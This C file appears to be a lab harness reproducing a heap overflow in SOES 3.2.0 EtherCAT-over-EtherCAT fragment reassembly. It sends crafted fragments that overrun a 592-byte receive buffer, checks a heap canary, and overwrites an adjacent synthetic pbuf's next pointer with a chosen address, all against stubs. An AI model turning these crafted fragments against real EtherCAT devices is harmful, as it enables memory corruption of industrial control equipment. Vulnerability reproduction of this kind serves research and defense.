/* SOES 3.2.0 EoE reassembly harness (CVE-2026-129794, loopback-only lab).
 *
 * Feeds crafted EoE fragment mailboxes through the real ESC_eoeprocess()
 * dispatcher. Only four externals of esc_eoe.c are stubbed below. The
 * application receive buffer is deliberately sized 592 bytes, matching the
 * lwIP sample in the RT-Labs advisory; fragment 0 declares a 2016-byte frame,
 * so all memcpy bounds in 3.2.0 derive from the wire-declared size.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "esc.h"
/* SOES cc.h defines htoes/etohs as identity on little-endian hosts:
 * wire fields are stored host-order, so no htons() here. */

/* esc_eoe.c-private constants, mirrored from the pinned source. */
#define EOE_FRAG_DATA          0
#define EOE_HDR_LAST_FRAGMENT  (0x1 << 8)
#include "esc_eoe.h"

#define RXBUFSIZE 592
#define FRAGDATA  96

_ESCvar ESCvar;
_MBXcontrol MBXcontrol[MBXBUFFERS];
uint8_t MBX[1024];

uint8_t ESC_claimbuffer(void)
{
   /* Error-response path only; no free mailbox needed in this harness. */
   return 0;
}

static int recv_calls;
static size_t recv_len;
static int canary_mode;
static uint8_t *canary;

/* Stand-in for the upstream rtl_lwip_eoe callback, which uses an lwIP
 * PBUF_POOL: pool objects are adjacent and each begins with a next pointer.
 * This is a synthetic layout, not upstream lwIP or a live target. */
struct fake_pbuf
{
   void *next;
   void *payload;
   uint16_t tot_len;
   uint16_t len;
   uint8_t flags;
   uint8_t rsvd;
   uint16_t ref;
   uint8_t data[RXBUFSIZE];
};
static struct fake_pbuf pool[2];
static const char marker_str[] = "SOES-POOL-MARKER";
static int pool_mode;
static int pool_initialized;

static void get_buffer(eoe_pbuf_t *ebuf)
{
   if (pool_mode)
   {
      if (!pool_initialized)
      {
         memset(pool, 0, sizeof(pool));
         pool_initialized = 1;
      }
      ebuf->pbuf = &pool[0];
      ebuf->payload = pool[0].data;
      ebuf->len = RXBUFSIZE;
      return;
   }
   ebuf->pbuf = NULL;
   ebuf->payload = malloc(RXBUFSIZE);
   ebuf->len = RXBUFSIZE;
   if (canary_mode)
   {
      /* Adjacent heap object with a known pattern, allocated right after
       * the receive buffer so a plain-build overwrite is observable. */
      canary = malloc(128);
      memset(canary, 0x43, 128);
   }
}

static void free_buffer(eoe_pbuf_t *ebuf)
{
   if (!pool_mode && !canary_mode)
   {
      free(ebuf->payload);
   }
   ebuf->payload = NULL;
   ebuf->len = 0;
}

static void handle_recv_buffer(uint8_t port, eoe_pbuf_t *ebuf)
{
   (void) port;
   recv_calls++;
   recv_len = ebuf->len;
   if (canary_mode)
   {
      int touched = 0;
      int j;
      for (j = 0; j < 128; j++)
      {
         if (canary[j] != 0x43) touched++;
      }
      printf("canary_changed=%d canary_offset=%ld first_bytes=%02x%02x%02x%02x%02x%02x%02x%02x\n",
            touched, (long)(canary - ebuf->payload), canary[0], canary[1],
            canary[2], canary[3], canary[4], canary[5], canary[6], canary[7]);
   }
   free_buffer(ebuf);
}

static int fetch_send_buffer(uint8_t port, eoe_pbuf_t *ebuf)
{
   (void) port;
   (void) ebuf;
   return 0;
}

int main(int argc, char **argv)
{
   eoe_cfg_t cfg = {
      .get_buffer = get_buffer,
      .free_buffer = free_buffer,
      .handle_recv_buffer = handle_recv_buffer,
      .fetch_send_buffer = fetch_send_buffer,
   };
   int nfrag = (argc > 1) ? atoi(argv[1]) : 7;
   const char *mode = (argc > 2) ? argv[2] : "";
   canary_mode = (strcmp(mode, "canary") == 0);
   pool_mode = (strcmp(mode, "pool") == 0);
   int i;

   EOE_config(&cfg);
   ESCvar.activembxsize = 128;
   ESCvar.MBXrun = 1;
   EOE_init();

   for (i = 0; i < nfrag; i++)
   {
      _EOE *eoe = (_EOE *) &MBX[0];
      uint16_t frameinfo1 = EOE_FRAG_DATA;
      uint16_t frameinfo2;

      memset(MBX, 0, sizeof(MBX));
      eoe->mbxheader.length = ESC_EOEHSIZE + FRAGDATA;
      eoe->mbxheader.mbxtype = MBXEOE;

      /* Fragment 0 carries the declared frame size (63 * 32 = 2016).
       * Later fragments carry the running byte offset (i * 3 * 32). */
      frameinfo2 = (uint16_t) (i & 0x3f);
      frameinfo2 |= (uint16_t) (((i == 0) ? 63 : (i * 3)) << 6);
      if (i == nfrag - 1)
      {
         frameinfo1 |= EOE_HDR_LAST_FRAGMENT;
      }
      eoe->eoeheader.frameinfo1 = frameinfo1;
      eoe->eoeheader.frameinfo2 = frameinfo2;
      memset(eoe->data, 0x41 + i, FRAGDATA);
      if (pool_mode && i == nfrag - 1)
      {
         /* Bytes 16..23 of the last fragment land on pool[1].next:
          * payload base + 576 + 16 = pool[0] + 616 = pool[1].next. */
         uintptr_t addr = (uintptr_t) marker_str;
         int k;
         for (k = 0; k < 8; k++)
         {
            eoe->data[16 + k] = (uint8_t) (addr >> (8 * k));
         }
      }

      MBXcontrol[0].state = MBXstate_inclaim;
      ESCvar.xoe = 0;
      ESC_eoeprocess();
   }

   if (pool_mode)
   {
      printf("pool_next=%p marker=%p match=%d\n", pool[1].next,
            (void *) marker_str, pool[1].next == (void *) marker_str);
   }
   return 0;
}
